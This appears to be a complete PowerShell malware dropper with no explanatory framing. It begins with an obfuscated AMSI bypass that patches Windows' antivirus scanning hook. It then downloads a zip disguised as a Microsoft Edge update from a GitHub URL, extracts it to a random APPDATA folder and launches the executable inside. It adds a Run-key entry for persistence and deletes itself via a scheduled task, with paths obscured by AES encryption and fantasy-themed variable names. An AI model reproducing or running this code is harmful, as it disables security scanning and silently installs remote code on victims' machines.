class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)



function Invoke-MysteryTransformation {
    param (
        [string]$ArcaneData
    )
    try {
        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ArcaneData))
    } catch {
        return $null
    }
}

$ShadowToken = [guid]::NewGuid().ToString().Replace("-", "")

function Perform-Alchemy {
    param (
        [string]$MundaneText,
        [string]$PhilosophersStone
    )
    try {
        $StoneFragments = [System.Text.Encoding]::UTF8.GetBytes($PhilosophersStone.Substring(0, 32))
        $CrypticCauldron = [System.Security.Cryptography.AesManaged]::Create()
        $CrypticCauldron.Key = $StoneFragments
        $CrypticCauldron.IV = New-Object Byte[] 16
        $ArcaneConverter = $CrypticCauldron.CreateEncryptor()
        $TextEssence = [System.Text.Encoding]::UTF8.GetBytes($MundaneText)

        $EnchantedOutput = $ArcaneConverter.TransformFinalBlock($TextEssence, 0, $TextEssence.Length)

        return [Convert]::ToBase64String($EnchantedOutput)
    } catch {
        return $null
    }
}

function Reverse-Alchemy {
    param (
        [string]$CursedText,
        [string]$PhilosophersStone
    )
    try {
        $StoneFragments = [System.Text.Encoding]::UTF8.GetBytes($PhilosophersStone.Substring(0, 32))
        $CrypticCauldron = [System.Security.Cryptography.AesManaged]::Create()
        $CrypticCauldron.Key = $StoneFragments
        $CrypticCauldron.IV = New-Object Byte[] 16
        $PurificationDevice = $CrypticCauldron.CreateDecryptor()

        $DarkMatter = [Convert]::FromBase64String($CursedText)

        $PurifiedText = $PurificationDevice.TransformFinalBlock($DarkMatter, 0, $DarkMatter.Length)

        return [System.Text.Encoding]::UTF8.GetString($PurifiedText)
    } catch {
        return $null
    }
}

$ForbiddenRepository = 'https://raw.githubusercontent.com/verifiedupdates/microsoft/refs/heads/main/edge_update.zip'
$SanctumPath = Perform-Alchemy -MundaneText (Join-Path $env:APPDATA ('ARC' + (Get-Random -Minimum 1000 -Maximum 9999).ToString())) -PhilosophersStone $ShadowToken
$RelicContainer = Perform-Alchemy -MundaneText (Join-Path $env:APPDATA ('art' + (Get-Random -Minimum 100 -Maximum 999).ToString() + '.zip')) -PhilosophersStone $ShadowToken
$ChaliceOfPower = Perform-Alchemy -MundaneText (Join-Path (Reverse-Alchemy -CursedText $SanctumPath -PhilosophersStone $ShadowToken) 'Edge.exe') -PhilosophersStone $ShadowToken


$UnveiledSanctum = Reverse-Alchemy -CursedText $SanctumPath -PhilosophersStone $ShadowToken
if (-not (Test-Path $UnveiledSanctum)) {
    try {
        New-Item -Path $UnveiledSanctum -ItemType Directory -Force | Out-Null
    }
    catch {
        exit
    }
}

function Summon-EldritchKnowledge {
    param (
        [string]$EldritchScroll,
        [string]$ArcaneVault
    )
    $DestinationPortal = Reverse-Alchemy -CursedText $ArcaneVault -PhilosophersStone $ShadowToken
    
    try {
        Invoke-WebRequest -Uri $EldritchScroll -OutFile $DestinationPortal -ErrorAction Stop
        
        $ScrollSigil = [System.IO.File]::ReadAllBytes($DestinationPortal)[0..3]
        $IsForbiddenKnowledge = ($ScrollSigil[0] -eq 0x50 -and $ScrollSigil[1] -eq 0x4B -and $ScrollSigil[2] -eq 0x03 -and $ScrollSigil[3] -eq 0x04)
        
        if (-not $IsForbiddenKnowledge) {
            Remove-Item $DestinationPortal -Force -ErrorAction SilentlyContinue
            return $false
        }
        return $true
    } catch {
        return $false
    }
}

function Unravel-ForbiddenTome {
    param (
        [string]$SealedTome,
        [string]$DestinationSanctum
    )
    $TomeLocation = Reverse-Alchemy -CursedText $SealedTome -PhilosophersStone $ShadowToken
    $SanctumGate = Reverse-Alchemy -CursedText $DestinationSanctum -PhilosophersStone $ShadowToken
    
    try {
        if (-not (Test-Path $TomeLocation)) {
            return
        }

        if (-not (Test-Path $SanctumGate)) {
            New-Item -Path $SanctumGate -ItemType Directory -Force | Out-Null
        }

        Expand-Archive -Path $TomeLocation -DestinationPath $SanctumGate -Force
        
    } catch {
        return
    }
}

function Invoke-DarkRitual {
    param (
        [string]$RitualFocus
    )
    $FocusPoint = Reverse-Alchemy -CursedText $RitualFocus -PhilosophersStone $ShadowToken
    
    if (-not (Test-Path $FocusPoint)) {
        return
    }

    try {
        Start-Process -FilePath $FocusPoint -ErrorAction Stop
    } catch {
        if ($_.Exception.Message -like "*cannot be run*") {
            try {
                Unblock-File -Path $FocusPoint -ErrorAction SilentlyContinue
                Start-Process -FilePath $FocusPoint -ErrorAction Stop
            } catch {
            }
        }
    }
}

function Establish-EternalCovenant {
    param (
        [string]$PactLocation,
        [string]$PactName,
        [string]$RitualFocus
    )
    $AltarOfPacts = Reverse-Alchemy -CursedText $PactLocation -PhilosophersStone $ShadowToken
    $MarkOfBinding = Reverse-Alchemy -CursedText $PactName -PhilosophersStone $ShadowToken
    $FocusPoint = Reverse-Alchemy -CursedText $RitualFocus -PhilosophersStone $ShadowToken
    try {
        New-ItemProperty -Path $AltarOfPacts -Name $MarkOfBinding -Value $FocusPoint -PropertyType 'String' -Force
    } catch {
    }
}

$RelicContainer = Perform-Alchemy -MundaneText (Reverse-Alchemy -CursedText $RelicContainer -PhilosophersStone $ShadowToken) -PhilosophersStone $ShadowToken
$SanctumPath = Perform-Alchemy -MundaneText (Reverse-Alchemy -CursedText $SanctumPath -PhilosophersStone $ShadowToken) -PhilosophersStone $ShadowToken
$ChaliceOfPower = Perform-Alchemy -MundaneText (Reverse-Alchemy -CursedText $ChaliceOfPower -PhilosophersStone $ShadowToken) -PhilosophersStone $ShadowToken
$PactDimension = Perform-Alchemy -MundaneText 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -PhilosophersStone $ShadowToken
$MarkOfTheChosen = Perform-Alchemy -MundaneText ('sigil' + (Get-Random -Minimum 100 -Maximum 999).ToString()) -PhilosophersStone $ShadowToken

$KnowledgeAcquired = Summon-EldritchKnowledge -EldritchScroll $ForbiddenRepository -ArcaneVault $RelicContainer

if (-not $KnowledgeAcquired) {
    exit 1
}

Start-Sleep -Milliseconds (Get-Random -Minimum 5000 -Maximum 9000)

try {
    Unravel-ForbiddenTome -SealedTome $RelicContainer -DestinationSanctum $SanctumPath
} catch {
    exit 1
}

try {
    Remove-Item (Reverse-Alchemy -CursedText $RelicContainer -PhilosophersStone $ShadowToken) -Force
} catch {
}

try {
    Invoke-DarkRitual -RitualFocus $ChaliceOfPower
} catch {
    exit 1
}

try {
    Establish-EternalCovenant -PactLocation $PactDimension -PactName $MarkOfTheChosen -RitualFocus $ChaliceOfPower
} catch {
}

Start-Sleep -Seconds 2 

$scriptPath = $MyInvocation.MyCommand.Path

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"Remove-Item -LiteralPath '$scriptPath' -Force -ErrorAction SilentlyContinue`""
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(1)
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -DontStopOnIdleEnd -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "TempScriptCleanup_$([Guid]::NewGuid().ToString())" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

exit
